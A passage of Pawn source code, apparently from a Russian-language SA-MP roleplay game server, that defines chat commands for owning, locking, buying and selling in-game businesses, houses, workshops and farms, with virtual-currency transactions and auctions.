	for(new h = 1; h <= TotalBizz; h++) if(BizzInfo[h][bMafia] == PTEMP[playerid][pMember]) format(YCMDstr, sizeof(YCMDstr), " [%i] %s\n",h, BizzInfo[h][bMessage]), strcat(strrr, YCMDstr);
	if (strlen(strrr) > 1) ShowPlayerDialogEx(playerid, 11349, 2, "Завоёванные бизнесы", strrr, "$", "$");
	else SCM(playerid,-1,"Нет бизнесов");
	return true;
}
CMD:bizmafia(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PTEMP[playerid][pPBizzKey];
	if(BizzInfo[bouse][bMafia]) return SCM(playerid,COLOR_GREY," Бизнес уже крышуют!");
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /bizmafia [мафия]");
		return SCM(playerid, -1," 0 - Yakuza | 1 - RM | 2 - LCN");
	}
	switch (params[0])
	{
	case 0: BizzInfo[bouse][bMafia] = 6, SCM(playerid,  -1,  " Крыша бизнеса - Yakuza");
	case 1: BizzInfo[bouse][bMafia] = 14, SCM(playerid,  -1, " Крыша бизнеса - RM");
	case 2: BizzInfo[bouse][bMafia] = 5, SCM(playerid,  -1,  " Крыша бизнеса - LCN");
	default: SCM(playerid, COLOR_GREY," Неверное значение");
	}
	return true;
}
CMD:bizenterc(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PTEMP[playerid][pPBizzKey];
	if(BizzInfo[bouse][bType] != 1) return SCM(playerid,COLOR_GREY," Данная команда доступна только владельцам клубов/баров");
	if(sscanf(params, "d", params[0])) return	SCM(playerid, -1, " Введите: /bizenterc [цена]");
	if(params[0] < 100 || params[0] > 9999)  return SCM(playerid, COLOR_GREY, " Минимальная цена 100, максимальная 9999 вирт");
	BizzInfo[bouse][bEntranceCost] = params[0];
	UpdateBizz(bouse);
	format(YCMDstr, sizeof(YCMDstr), " Плата за вход %i вирт.", BizzInfo[bouse][bEntranceCost]);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:bizwithdraw(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid))  return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PTEMP[playerid][pPBizzKey];
	if(sscanf(params, "d", params[0]))
	{
		format(YCMDstr, sizeof(YCMDstr),  " На счету бизнеса %i вирт", BizzInfo[bouse][bTill]);
		SCM(playerid, COLOR_GRAD3, YCMDstr);
		return SCM(playerid, -1, " Введите: /bizwithdraw [сумма]");
	}
	if(params[0] > BizzInfo[bouse][bTill] || params[0] < 1)  return SCM(playerid, COLOR_GRAD2, " На счету бизнеса нет столько денег!");
	if (!PlayerToPoint(100, playerid,BizzInfo[bouse][bEntranceX],BizzInfo[bouse][bEntranceY],BizzInfo[bouse][bEntranceZ]))
	{
		SCM(playerid, COLOR_GRAD2, " Вам нужно быть возле бизнеса!");
		return true;
	}
	else
	{
		PTEMP[playerid][pCash] +=params[0];
		BizzInfo[bouse][bTill] -= params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы забрали %i вирт, из банка бизнеса. Остаток: %i вирт",params[0],BizzInfo[bouse][bTill]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял %i вирт со счёта бизнеса", Name(playerid), params[0]);
		return true;
	}
}
CMD:bizbalance(playerid)
{
    if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid))  return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PTEMP[playerid][pPBizzKey];
	SendMes(playerid, COLOR_GRAD2, " На счету бизнеса %i вирт", BizzInfo[bouse][bTill]);
	return true;
}
CMD:getbizstats(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new bizz[40];
	if(sscanf(params, "s[40]", bizz)) return SCM(playerid,-1," Введите: /getbizstats [название(пример: Alhambra)]");
	for(new h = 1; h <= TotalBizz; h++)
	{
		if(PlayerToPoint(3.0, playerid,BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ]) && !strcmp(bizz,BizzInfo[h][bMessage],true)) return PrintBizInfo(playerid,h);
	}
	return SCM(playerid,COLOR_GREY," Вы должны находиться возле бизнеса / неверное название бизнеса");
}
CMD:getcampos(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	new Float:x1,Float:y1,Float:z1;
	GetPlayerCameraLookAt(playerid,x1,y1,z1);
	format(YCMDstr, sizeof(YCMDstr), " GetPlayerCameraLookAt %f,%f,%f",x1,y1,z1);
	SCM(playerid,COLOR_GREY,YCMDstr);
	GetPlayerCameraPos(playerid,x1,y1,z1);
	format(YCMDstr, sizeof(YCMDstr), " GetPlayerCameraPos %f,%f,%f",x1,y1,z1);
	SCM(playerid,COLOR_GREY,YCMDstr);
	return true;
}
CMD:spwcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /spwcar [carid]");
	SetVehicleToRespawn(params[0]);
	printf("Администратор %s заспавнил транспорт [ID: %i]", Name(playerid), params[0]);
	return true;
}
CMD:endlesson(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(TakingLesson[playerid] == 0) return SCM(playerid, COLOR_GRAD1, " Вы не сдаете экзамен на вождение!");
	LessonCar[playerid] = 0;
	LessonStat[playerid] = 0;
	TakingLesson[playerid] = 0;
	RemovePlayerFromVehicleAC(playerid);
	return true;
}
CMD:bizstats(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GREY, " Вы не владеете бизнесом");
	PrintBizInfo(playerid,PTEMP[playerid][pPBizzKey]);
	return true;
}
CMD:bizlock(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "s[32]", params[0])) return SCM(playerid, -1, " Введите: /bizlock [название бизнеса]");
	new bid = 0;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(!strcmp(params[0], BizzInfo[i][bMessage], true))
		{
			bid = i;
			break;
		}
	}
	if(bid == 0) return SCM(playerid, COLOR_GREY, " Неизвестное название");
	if(PTEMP[playerid][pMember] == 2 && PTEMP[playerid][pRank] >= 5)
	{
		if(BizzInfo[bid][bLocked] == 1)
		{
			BizzInfo[bid][bLocked] = 0;
			SCM(playerid, COLOR_GRAD1, " Вы открыли бизнес");
			printf("Игрок %s открыл бизнес %i", Name(playerid), bid);
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			if(GetPlayerID(BizzInfo[bid][bOwner]) != INVALID_PLAYER_ID)
			SendMes(GetPlayerID(BizzInfo[bid][bOwner]), COLOR_RED, " Агент ФБР %s закрыл Ваш бизнес!", PTEMP[playerid][pName]);
			return true;
		}
		if(BizzInfo[bid][bLocked] == 0)
		{
			BizzInfo[bid][bLocked] = 1;
			SCM(playerid, COLOR_GRAD1, " Вы закрыли бизнес");
			printf("Игрок %s закрыл бизнес %i", Name(playerid), bid);
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			if(GetPlayerID(BizzInfo[bid][bOwner]) != INVALID_PLAYER_ID)
			SendMes(GetPlayerID(BizzInfo[bid][bOwner]), COLOR_RED, " Агент ФБР %s открыл Ваш бизнес!", PTEMP[playerid][pName]);
			return true;
		}
	}
	else if(PTEMP[playerid][pPBizzKey] == bid)
	{
		if(BizzInfo[bid][bLocked] == 0) return SCM(playerid, COLOR_GREY, " Бизнес уже открыт!");
		if(BizzInfo[bid][bProducts] <= 0 || BizzInfo[bid][bLicense] == 0) return SCM(playerid, COLOR_GREY, " В бизнесе нет продуктов или нет лицензии!");
		BizzInfo[bid][bLocked] = 0;
		BizzInfo[bid][bLockTime] = 0;
		SCM(playerid, COLOR_LIGHTRED, " Вы открыли бизнес. Всегда следите за состоянием продуктов и лицензией");
		SCM(playerid, COLOR_LIGHTRED,  " В противном случае вы можете потерять бизнес");
	}
	return true;
}
CMD:buyinterior(playerid, params[])
{
	if(!HGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет дома");
	new bouse = PTEMP[playerid][pPHouseKey];
	if((PlayerToPoint(30, playerid,HouseInfo[bouse][hExitx],HouseInfo[bouse][hExity],HouseInfo[bouse][hExitz]) && GetPlayerVirtualWorld(playerid) == bouse+50) || GetPVarInt(playerid, "BuyInt") != 0)
	{
		if(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 0) ShowPlayerDialogEx(playerid, 195, DIALOG_STYLE_LIST, "Список интерьеров", "N-I\nN-II\nN-III\nN-IV\nN-V\nN-VI\nN-VII", "Осмотреть", "Отмена");
		if(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 1) ShowPlayerDialogEx(playerid, 20, DIALOG_STYLE_LIST, "Список интерьеров", "D-I\nD-II\nD-III\nD-IV\nD-V\nD-VI\nD-VII", "Осмотреть", "Отмена");
		if(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 2) ShowPlayerDialogEx(playerid, 185, DIALOG_STYLE_LIST, "Список интерьеров", "C-I\nC-II\nC-III\nC-IV\nC-V\nC-VI\nC-VII\nC-VIII\nC-IX", "Осмотреть", "Отмена");
		if(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 3) ShowPlayerDialogEx(playerid, 175, DIALOG_STYLE_LIST, "Список интерьеров", "B-I\nB-II\nB-III\nB-IV\nB-V", "Осмотреть", "Отмена");
		if(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 4 || HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 5) ShowPlayerDialogEx(playerid, 165, DIALOG_STYLE_LIST, "Список интерьеров", "A-I\nA-II\nA-III\nA-IV\nA-V", "Осмотреть", "Отмена");
	}
	else return SCM(playerid, COLOR_GREY, " Нужно находиться внутри дома. (Нужно находиться возле выхода)");
	if(GetPVarInt(playerid, "BuyInt") == 1) ShowPlayerDialogEx(playerid, 22, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 2) ShowPlayerDialogEx(playerid, 23, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 3) ShowPlayerDialogEx(playerid, 24, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 4) ShowPlayerDialogEx(playerid, 25, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 5) ShowPlayerDialogEx(playerid, 26, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 6) ShowPlayerDialogEx(playerid, 27, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 7) ShowPlayerDialogEx(playerid, 28, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 41) ShowPlayerDialogEx(playerid, 41, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 42) ShowPlayerDialogEx(playerid, 42, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 43) ShowPlayerDialogEx(playerid, 43, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 44) ShowPlayerDialogEx(playerid, 44, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 45) ShowPlayerDialogEx(playerid, 45, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 71) ShowPlayerDialogEx(playerid, 71, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 72) ShowPlayerDialogEx(playerid, 72, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 73) ShowPlayerDialogEx(playerid, 73, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 74) ShowPlayerDialogEx(playerid, 74, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 75) ShowPlayerDialogEx(playerid, 75, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 81) ShowPlayerDialogEx(playerid, 81, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 82) ShowPlayerDialogEx(playerid, 82, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 83) ShowPlayerDialogEx(playerid, 83, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 84) ShowPlayerDialogEx(playerid, 84, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 85) ShowPlayerDialogEx(playerid, 85, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 86) ShowPlayerDialogEx(playerid, 86, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 87) ShowPlayerDialogEx(playerid, 87, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 88) ShowPlayerDialogEx(playerid, 88, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 89) ShowPlayerDialogEx(playerid, 89, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 91) ShowPlayerDialogEx(playerid, 91, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 92) ShowPlayerDialogEx(playerid, 92, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 93) ShowPlayerDialogEx(playerid, 93, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 94) ShowPlayerDialogEx(playerid, 94, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 95) ShowPlayerDialogEx(playerid, 95, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 96) ShowPlayerDialogEx(playerid, 96, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 97) ShowPlayerDialogEx(playerid, 97, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	return true;
}
CMD:buyhouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	for(new h = 1; h <= TotalHouse; h++)
	{
		if((PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) || (PlayerToPoint(2.0, playerid, HouseInfo[h][hExitx], HouseInfo[h][hExity], HouseInfo[h][hExitz]) && GetPlayerVirtualWorld(playerid) == h+50))
				&& strcmp(HouseInfo[h][hOwner],"None",true) == 0)
		{
			if(HGet(playerid)) return SCM(playerid, -1, " У вас уже есть дом!");
			if(KGet(playerid)) return SCM(playerid,COLOR_GREY," Для начала продайте квартиру");
			if(PTEMP[playerid][pBank] < HouseInfo[h][hValue]) return SCM(playerid,COLOR_GREY," Недостаточно денег для покупки!");
			if(HouseInfo[h][hValue] == 0) return SCM(playerid,COLOR_GREY," Этот дом нельзя купить!");
			HouseInfo[h][hHel] = 0;
			HouseInfo[h][hLock] = 1;
			strmid(HouseInfo[h][hOwner],PTEMP[playerid][pName], 0, strlen(PTEMP[playerid][pName]), 32);
			HGet(playerid);
			PTEMP[playerid][pBank] -= HouseInfo[h][hValue];
			SetPlayerInterior(playerid,HouseInfo[h][hInt]);
			SetPlayerPos(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
			SetPlayerVirtualWorld(playerid,h+50);
			HouseInfo[h][hTakings] = GetHouseOplata(h);
			SCM(playerid, -1, " Поздравляем с покупкой!");
			format(YCMDstr, sizeof(YCMDstr), " Внимание! Теперь каждый час со счёта вашего дома будут снимать комунальные платежи, в размере %i вирт",GetHouseOplata(h));
			SCM(playerid, COLOR_YELLOW,YCMDstr);
			SCM(playerid, COLOR_YELLOW, " Если на счету недостаточно денег, вас выселят");
			SCM(playerid, COLOR_YELLOW, " Пополнить домашний счёт или узнать баланс можно через банк/банкомат");
			GameTextForPlayer(playerid,"~w~welcome home~n~print:~g~/exit", 5000, 3);
			new house = PTEMP[playerid][pPHouseKey];
			if(house_car[playerid] != -1)
			{
				DestroyVehicle(house_car[playerid]);
				house_car[playerid] = -1;
			}
			
			mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_CARS"` WHERE `owner` = '%s'",PTEMP[playerid][pName]), mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",33,playerid,"");
			BuyHouse(house);
			SaveMySQL(5,house);
			PTEMP[playerid][pSpawnChange][0] = 0;
			printf("Игрок %s купил дом %i", Name(playerid), h);
			return true;
		}
	}
	return true;
}
CMD:sellprodsone(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 1)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать продукты\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][3],car_prods[GetPlayerVehicleID(playerid)][3]*16);
				return ShowPlayerDialogEx(playerid,1387,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:sellprodstwo(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 2)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать продукты\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][3],car_prods[GetPlayerVehicleID(playerid)][3]*16);
				return ShowPlayerDialogEx(playerid,1388,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:sellprodsthree(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 3)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать Товары\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][2],car_prods[GetPlayerVehicleID(playerid)][2]*16);
				return ShowPlayerDialogEx(playerid,1389,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:sellprodsfour(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 4)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[2] && newcar <= comptruck[3])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать топливо\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][1],car_prods[GetPlayerVehicleID(playerid)][1]*16);
				return ShowPlayerDialogEx(playerid,1390,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:buybiz(playerid, params[])
{
	new sstring[10];
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(BGet(playerid))  return SCM(playerid, -1, " У вас уже есть бизнес, введите /sellbiz чтобы его продать.");
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && strcmp(BizzInfo[bizz][bOwner],"None",true) == 0)
		{
			bizselect[playerid] = bizz;
			if(BizzInfo[bizselect[playerid]][bLastStavka] == 0) format(sstring,9,"%i",BizzInfo[bizselect[playerid]][bStavka]);
			else format(sstring,32,"Скрыта");
			format(YCMDstr,sizeof(YCMDstr),"{FFFF00}Бизнес: %s.\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",BizzInfo[bizselect[playerid]][bMessage],BizzInfo[bizselect[playerid]][bTimeStavka],BizzInfo[bizselect[playerid]][bLastStavka], sstring);
			ShowPlayerDialogEx(playerid,1668,DIALOG_STYLE_LIST,"Аукцион",YCMDstr, "Далее", "Отмена");
			return true;
		}
	}
	return true;
}
CMD:buytune(playerid, params[])
{
	new str[10];
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(WGet(playerid))  return SCM(playerid, -1, " У вас уже есть автомастерская");
	for(new i = 1; i <= TOTALSHOPS; i++)
	{
		if(!PlayerToPoint(5.0, playerid, WorkshopInfo[i][wEntr][0], WorkshopInfo[i][wEntr][1], WorkshopInfo[i][wEntr][2]) || strcmp(WorkshopInfo[i][wOwner],"None",true) != 0) continue;
		bizselect[playerid] = i;
		if(WorkshopInfo[bizselect[playerid]][wAuction][1] == 0) format(str,9,"%i",WorkshopInfo[bizselect[playerid]][wAuction][0]);
		else format(str,16,"Скрыта");
		format(YCMDstr,sizeof(YCMDstr),"{FFFF00}Бизнес: СТО [%i].\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",WorkshopInfo[bizselect[playerid]][wID]-1,WorkshopInfo[bizselect[playerid]][wAuction][2],WorkshopInfo[bizselect[playerid]][wAuction][1], str);
		ShowPlayerDialogEx(playerid,1691,DIALOG_STYLE_LIST,"Аукцион бизнесов",YCMDstr, "Далее", "Отмена");
		break;
	}
	return true;
}
CMD:buyfarm(playerid, params[])
{
	new str[10];
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(FGet(playerid))  return SCM(playerid, -1, " У вас уже есть ферма");
	for(new i = 1; i <= TOTALFARM; i++)
	{
		if(!PlayerToPoint(10.0, playerid, FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2]) || strcmp(FarmInfo[i][fOwner],"None",true) != 0) continue;
		bizselect[playerid] = i;
		if(FarmInfo[bizselect[playerid]][fAuction][1] == 0) format(str,9,"%i",FarmInfo[bizselect[playerid]][fAuction][0]);
		else format(str,16,"Скрыта");
		format(YCMDstr,sizeof(YCMDstr),"{FFFF00}Бизнес: Ферма [%i].\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",FarmInfo[bizselect[playerid]][fID]-1,FarmInfo[bizselect[playerid]][fAuction][2],FarmInfo[bizselect[playerid]][fAuction][1], str);
		ShowPlayerDialogEx(playerid,1693,DIALOG_STYLE_LIST,"Аукцион бизнесов",YCMDstr, "Далее", "Отмена");
		break;
	}
	return true;
}
CMD:selltune(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!WGet(playerid)) return SCM(playerid,-1," {B8B8B8} Вы не владеете Автомастерской");
	new i = GetPVarInt(playerid,"wShop");
	if(!PlayerToPoint(5.0, playerid, WorkshopInfo[i][wEntr][0], WorkshopInfo[i][wEntr][1], WorkshopInfo[i][wEntr][2])) return SCM(playerid,COLOR_GREY," Необходимо находиться возле автомастерской!");
	PTEMP[playerid][pBank] += WorkshopInfo[i][wBank]+WorkshopInfo[i][wLandTax];
	format(string,40,"~w~workshop in sold~n~~g~$%i",WorkshopInfo[i][wBank]+WorkshopInfo[i][wLandTax]);
	GameTextForPlayer(playerid,string, 5000, 3);
	strmid(WorkshopInfo[i][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
	WorkshopInfo[i][wAuction][0] = 0;
	WorkshopInfo[i][wAuction][1] = 0;
	WorkshopInfo[i][wAuction][2] = 0;
	WorkshopInfo[i][wAuction][3] = 0;
	WorkshopInfo[i][wAuction][4] = 0;
	WorkshopInfo[i][wLandTax] = 0;
	WorkshopInfo[i][wBank] = 0;
	WorkshopInfo[i][wProds] = 0;
	WorkshopInfo[i][wPriceProds] = 50;
	WorkshopInfo[i][wZp] = 5;
	DeletePVar(playerid,"wShop");
 	printf("Игрок %s продал СТО [ID: %i]", Name(playerid), i+1);
